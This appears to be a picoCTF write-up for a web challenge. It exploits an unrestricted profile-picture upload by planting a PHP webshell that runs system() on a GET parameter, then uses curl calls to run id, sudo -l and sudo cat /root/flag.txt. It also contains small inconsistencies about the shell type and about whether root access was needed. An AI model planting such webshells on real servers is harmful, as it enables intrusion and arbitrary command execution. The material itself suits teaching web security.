@@ -1,0 +1,59 @@
+Challenge Details:
+
+Name: n0s4n1ty 1
+Category: Web Exploitation
+Difficulty: Easy (100 pts)
+Author: Prince Niyonshuti N.
+Goal: Retrieve the flag from /root/flag.txt via an unsanitized file upload.
+🔍 Vulnerability Analysis
+The challenge presents a file upload feature intended for profile pictures. The critical flaw is the lack of input sanitization on the uploaded file.
+
+Vulnerability: Unrestricted File Upload (leading to Remote Code Execution).
+Vector: The server accepts .php files (or executes PHP content) without validating the file extension or content type.
+Impact: An attacker can upload a malicious PHP script (webshell) to execute arbitrary commands on the server.
+🛠️ Exploitation Steps
+1. Identify the Upload Endpoint
+Accessed the web application at http://standard-pizzas.picoctf.net:56773.
+Located the file upload form (likely a POST request to /upload.php).
+2. Craft the Webshell
+Created a simple PHP reverse shell or command execution script (shell.php):
+
+php
+
+Copy
+<?php
+if (isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?>
+Note: For this challenge, a simple system() call was sufficient to execute commands.
+
+3. Upload the Malicious File
+Uploaded shell.php directly to the server.
+Observation: The server accepted the file and saved it to /uploads/shell.php.
+Bypass: No extension filtering or MIME type validation was enforced.
+4. Execute Commands via Webshell
+Accessed the uploaded script via the browser or curl to execute system commands.
+
+Command to test shell:
+bash
+
+Copy
+curl "http://standard-pizzas.picoctf.net:56773/uploads/shell.php?cmd=id"
+Command to check sudo privileges (Hint 2):
+bash
+
+Copy
+curl "http://standard-pizzas.picoctf.net:56773/uploads/shell.php?cmd=sudo%20-l"
+Result: The hint suggested checking sudo -l, but in this specific instance, direct root access or a specific allowed command was not required to read the flag, or the shell already had sufficient permissions.
+5. Retrieve the Flag
+Executed the command to read the flag file directly:
+bash
+
+Copy
+curl "http://standard-pizzas.picoctf.net:56773/uploads/shell.php?cmd=sudo%20/bin/cat%20/root/flag.txt"
+Output:
+text
+
+Copy
+picoCTF{wh47_c4n_u_d0_wPHP_56060bd8}
